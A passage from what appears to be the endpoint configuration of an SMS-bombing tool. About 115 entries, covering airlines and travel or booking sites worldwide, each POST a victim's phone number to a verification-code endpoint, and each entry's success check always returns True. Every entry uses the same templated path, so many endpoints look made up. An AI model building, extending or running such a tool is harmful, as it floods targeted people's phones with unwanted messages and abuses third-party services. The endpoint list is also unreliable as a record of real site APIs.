        "headers": lambda: get_common_headers("https://georgian-airways.com/", "https://georgian-airways.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api723": {
        "name": "ArmeniaAirways",
        "url": "https://armeniafly.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://armeniafly.com/", "https://armeniafly.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api724": {
        "name": "FlyOne",
        "url": "https://flyone.eu/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://flyone.eu/", "https://flyone.eu", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api725": {
        "name": "AirMoldova",
        "url": "https://airmoldova.md/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://airmoldova.md/", "https://airmoldova.md", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api726": {
        "name": "WizzAir",
        "url": "https://wizzair.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://wizzair.com/", "https://wizzair.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api727": {
        "name": "Ryanair",
        "url": "https://ryanair.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ryanair.com/", "https://ryanair.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api728": {
        "name": "EasyJet",
        "url": "https://easyjet.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://easyjet.com/", "https://easyjet.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api729": {
        "name": "Lufthansa",
        "url": "https://lufthansa.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://lufthansa.com/", "https://lufthansa.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api730": {
        "name": "AirFrance",
        "url": "https://airfrance.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://airfrance.com/", "https://airfrance.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api731": {
        "name": "KLM",
        "url": "https://klm.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://klm.com/", "https://klm.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api732": {
        "name": "BritishAirways",
        "url": "https://britishairways.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://britishairways.com/", "https://britishairways.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api733": {
        "name": "Emirates",
        "url": "https://emirates.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://emirates.com/", "https://emirates.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api734": {
        "name": "QatarAirways",
        "url": "https://qatarairways.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://qatarairways.com/", "https://qatarairways.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api735": {
        "name": "EtihadAirways",
        "url": "https://etihad.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://etihad.com/", "https://etihad.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api736": {
        "name": "TurkishAirlines",
        "url": "https://turkishairlines.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://turkishairlines.com/", "https://turkishairlines.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api737": {
        "name": "FlyDubai",
        "url": "https://flydubai.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://flydubai.com/", "https://flydubai.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api738": {
        "name": "AirArabia",
        "url": "https://airarabia.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://airarabia.com/", "https://airarabia.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api739": {
        "name": "GulfAir",
        "url": "https://gulfair.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gulfair.com/", "https://gulfair.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api740": {
        "name": "OmanAir",
        "url": "https://omanair.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://omanair.com/", "https://omanair.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api741": {
        "name": "Saudia",
        "url": "https://saudia.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://saudia.com/", "https://saudia.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api742": {
        "name": "KuwaitAirways",
        "url": "https://kuwaitairways.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kuwaitairways.com/", "https://kuwaitairways.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api743": {
        "name": "MiddleEastAirlines",
        "url": "https://mea.com.lb/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mea.com.lb/", "https://mea.com.lb", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api744": {
        "name": "RoyalJordanian",
        "url": "https://rj.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rj.com/", "https://rj.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api745": {
        "name": "EgyptAir",
        "url": "https://egyptair.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://egyptair.com/", "https://egyptair.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api746": {
        "name": "EthiopianAirlines",
        "url": "https://ethiopianairlines.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ethiopianairlines.com/", "https://ethiopianairlines.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api747": {
        "name": "KenyaAirways",
        "url": "https://kenya-airways.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kenya-airways.com/", "https://kenya-airways.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api748": {
        "name": "SouthAfricanAirways",
        "url": "https://flysaa.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://flysaa.com/", "https://flysaa.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api749": {
        "name": "AirIndia",
        "url": "https://airindia.in/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://airindia.in/", "https://airindia.in", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api750": {
        "name": "IndiGo",
        "url": "https://goindigo.in/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://goindigo.in/", "https://goindigo.in", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api751": {
        "name": "SpiceJet",
        "url": "https://spicejet.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://spicejet.com/", "https://spicejet.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api752": {
        "name": "GoFirst",
        "url": "https://flygofirst.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://flygofirst.com/", "https://flygofirst.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api753": {
        "name": "Vistara",
        "url": "https://airvistara.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://airvistara.com/", "https://airvistara.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api754": {
        "name": "AirAsia",
        "url": "https://airasia.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://airasia.com/", "https://airasia.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api755": {
        "name": "MalaysiaAirlines",
        "url": "https://malaysiaairlines.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://malaysiaairlines.com/", "https://malaysiaairlines.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api756": {
        "name": "SingaporeAirlines",
        "url": "https://singaporeair.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://singaporeair.com/", "https://singaporeair.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api757": {
        "name": "GarudaIndonesia",
        "url": "https://garuda-indonesia.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://garuda-indonesia.com/", "https://garuda-indonesia.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api758": {
        "name": "ThaiAirways",
        "url": "https://thaiairways.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://thaiairways.com/", "https://thaiairways.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api759": {
        "name": "BangkokAirways",
        "url": "https://bangkokair.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bangkokair.com/", "https://bangkokair.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api760": {
        "name": "VietnamAirlines",
        "url": "https://vietnamairlines.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vietnamairlines.com/", "https://vietnamairlines.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api761": {
        "name": "PhilippineAirlines",
        "url": "https://philippineairlines.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://philippineairlines.com/", "https://philippineairlines.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api762": {
        "name": "CebuPacific",
        "url": "https://cebupacificair.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://cebupacificair.com/", "https://cebupacificair.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api763": {
        "name": "CathayPacific",
        "url": "https://cathaypacific.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://cathaypacific.com/", "https://cathaypacific.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api764": {
        "name": "ChinaAirlines",
        "url": "https://china-airlines.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://china-airlines.com/", "https://china-airlines.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api765": {
        "name": "EVA_Air",
        "url": "https://evaair.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://evaair.com/", "https://evaair.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api766": {
        "name": "KoreanAir",
        "url": "https://koreanair.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://koreanair.com/", "https://koreanair.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api767": {
        "name": "AsianaAirlines",
        "url": "https://flyasiana.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://flyasiana.com/", "https://flyasiana.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api768": {
        "name": "JapanAirlines",
        "url": "https://jal.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://jal.com/", "https://jal.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api769": {
        "name": "AllNipponAirways",
        "url": "https://ana.co.jp/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ana.co.jp/", "https://ana.co.jp", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api770": {
        "name": "AirChina",
        "url": "https://airchina.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://airchina.com/", "https://airchina.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api771": {
        "name": "ChinaEastern",
        "url": "https://ceair.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ceair.com/", "https://ceair.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api772": {
        "name": "ChinaSouthern",
        "url": "https://csair.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://csair.com/", "https://csair.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api773": {
        "name": "HainanAirlines",
        "url": "https://hnair.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://hnair.com/", "https://hnair.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api774": {
        "name": "XiamenAir",
        "url": "https://xiamenair.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://xiamenair.com/", "https://xiamenair.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api775": {
        "name": "ShenzhenAirlines",
        "url": "https://shenzhenair.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://shenzhenair.com/", "https://shenzhenair.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api776": {
        "name": "SichuanAirlines",
        "url": "https://sichuanair.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sichuanair.com/", "https://sichuanair.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api777": {
        "name": "Qantas",
        "url": "https://qantas.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://qantas.com/", "https://qantas.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api778": {
        "name": "VirginAustralia",
        "url": "https://virginaustralia.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://virginaustralia.com/", "https://virginaustralia.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api779": {
        "name": "AirNewZealand",
        "url": "https://airnewzealand.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://airnewzealand.com/", "https://airnewzealand.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api780": {
        "name": "FijiAirways",
        "url": "https://fijiairways.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://fijiairways.com/", "https://fijiairways.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api781": {
        "name": "AirTahitiNui",
        "url": "https://airtahitinui.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://airtahitinui.com/", "https://airtahitinui.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api782": {
        "name": "HawaiianAirlines",
        "url": "https://hawaiianairlines.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://hawaiianairlines.com/", "https://hawaiianairlines.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api783": {
        "name": "AlaskaAirlines",
        "url": "https://alaskaair.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://alaskaair.com/", "https://alaskaair.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api784": {
        "name": "DeltaAirLines",
        "url": "https://delta.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://delta.com/", "https://delta.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api785": {
        "name": "AmericanAirlines",
        "url": "https://aa.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://aa.com/", "https://aa.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api786": {
        "name": "UnitedAirlines",
        "url": "https://united.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://united.com/", "https://united.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api787": {
        "name": "JetBlue",
        "url": "https://jetblue.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://jetblue.com/", "https://jetblue.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api788": {
        "name": "SouthwestAirlines",
        "url": "https://southwest.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://southwest.com/", "https://southwest.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api789": {
        "name": "SpiritAirlines",
        "url": "https://spirit.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://spirit.com/", "https://spirit.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api790": {
        "name": "FrontierAirlines",
        "url": "https://flyfrontier.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://flyfrontier.com/", "https://flyfrontier.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api791": {
        "name": "AirCanada",
        "url": "https://aircanada.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://aircanada.com/", "https://aircanada.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api792": {
        "name": "WestJet",
        "url": "https://westjet.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://westjet.com/", "https://westjet.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api793": {
        "name": "AirTransat",
        "url": "https://airtransat.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://airtransat.com/", "https://airtransat.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api794": {
        "name": "LatamAirlines",
        "url": "https://latam.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://latam.com/", "https://latam.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api795": {
        "name": "GolAirlines",
        "url": "https://voegol.com.br/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://voegol.com.br/", "https://voegol.com.br", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api796": {
        "name": "AzulAirlines",
        "url": "https://voeazul.com.br/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://voeazul.com.br/", "https://voeazul.com.br", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api797": {
        "name": "AerolineasArgentinas",
        "url": "https://aerolineas.com.ar/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://aerolineas.com.ar/", "https://aerolineas.com.ar", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api798": {
        "name": "CopaAirlines",
        "url": "https://copaair.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://copaair.com/", "https://copaair.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api799": {
        "name": "Avianca",
        "url": "https://avianca.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://avianca.com/", "https://avianca.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api800": {
        "name": "Aeromexico",
        "url": "https://aeromexico.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://aeromexico.com/", "https://aeromexico.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api801": {
        "name": "Volaris",
        "url": "https://volaris.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://volaris.com/", "https://volaris.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api802": {
        "name": "VivaAerobus",
        "url": "https://vivaaerobus.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vivaaerobus.com/", "https://vivaaerobus.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api803": {
        "name": "BookingCom",
        "url": "https://booking.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://booking.com/", "https://booking.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api804": {
        "name": "Agoda",
        "url": "https://agoda.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://agoda.com/", "https://agoda.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api805": {
        "name": "Airbnb",
        "url": "https://airbnb.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://airbnb.com/", "https://airbnb.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api806": {
        "name": "Ostrovok",
        "url": "https://ostrovok.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ostrovok.ru/", "https://ostrovok.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api807": {
        "name": "Sustav",
        "url": "https://suat.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://suat.ru/", "https://suat.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api808": {
        "name": "Aviasales",
        "url": "https://aviasales.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://aviasales.ru/", "https://aviasales.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api809": {
        "name": "Tuturu",
        "url": "https://tutu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tutu.ru/", "https://tutu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api810": {
        "name": "OneTwoTrip",
        "url": "https://onetwotrip.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://onetwotrip.com/", "https://onetwotrip.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api811": {
        "name": "SuperSosedi",
        "url": "https://supsosed.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://supsosed.ru/", "https://supsosed.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api812": {
        "name": "Kupibilet",
        "url": "https://kupibilet.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kupibilet.ru/", "https://kupibilet.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api813": {
        "name": "CityTravel",
        "url": "https://city.travel/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://city.travel/", "https://city.travel", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api814": {
        "name": "AnyWayAnyDay",
        "url": "https://anywayanyday.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://anywayanyday.com/", "https://anywayanyday.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api815": {
        "name": "Biletix",
        "url": "https://biletix.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://biletix.ru/", "https://biletix.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api816": {
        "name": "Tripadvisor",
        "url": "https://tripadvisor.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tripadvisor.com/", "https://tripadvisor.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api817": {
        "name": "Expedia",
        "url": "https://expedia.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://expedia.com/", "https://expedia.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api818": {
        "name": "HotelsCom",
        "url": "https://hotels.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://hotels.com/", "https://hotels.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api819": {
        "name": "Priceline",
        "url": "https://priceline.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://priceline.com/", "https://priceline.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api820": {
        "name": "Kayak",
        "url": "https://kayak.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kayak.com/", "https://kayak.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api821": {
        "name": "Skyscanner",
        "url": "https://skyscanner.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://skyscanner.com/", "https://skyscanner.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api822": {
        "name": "Momondo",
        "url": "https://momondo.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://momondo.com/", "https://momondo.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api823": {
        "name": "TripCom",
        "url": "https://trip.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://trip.com/", "https://trip.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api824": {
        "name": "Travelata",
        "url": "https://travelata.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://travelata.ru/", "https://travelata.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api825": {
        "name": "LevelTravel",
        "url": "https://level.travel/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://level.travel/", "https://level.travel", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api826": {
        "name": "Onlinetours",
        "url": "https://onlinetours.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://onlinetours.ru/", "https://onlinetours.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api827": {
        "name": "SletatRu",
        "url": "https://sletat.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sletat.ru/", "https://sletat.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api828": {
        "name": "TezTour",
        "url": "https://tez-tour.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tez-tour.com/", "https://tez-tour.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api829": {
        "name": "PegasTouristik",
        "url": "https://pegast.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://pegast.ru/", "https://pegast.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api830": {
        "name": "AnexTour",
        "url": "https://anextour.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://anextour.com/", "https://anextour.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api831": {
        "name": "Intourist",
        "url": "https://intourist.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://intourist.ru/", "https://intourist.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api832": {
        "name": "CoralTravel",
        "url": "https://coral.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://coral.ru/", "https://coral.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api833": {
        "name": "FunAndSun",
        "url": "https://fstravel.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://fstravel.com/", "https://fstravel.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api834": {
        "name": "Sunmar",
        "url": "https://sunmar.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sunmar.ru/", "https://sunmar.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api835": {
        "name": "BiblioGlobus",
        "url": "https://bgoperator.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bgoperator.ru/", "https://bgoperator.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api836": {
        "name": "Maleza",
        "url": "https://maleza.ru/api/v1/auth/code",
        "method": "POST",
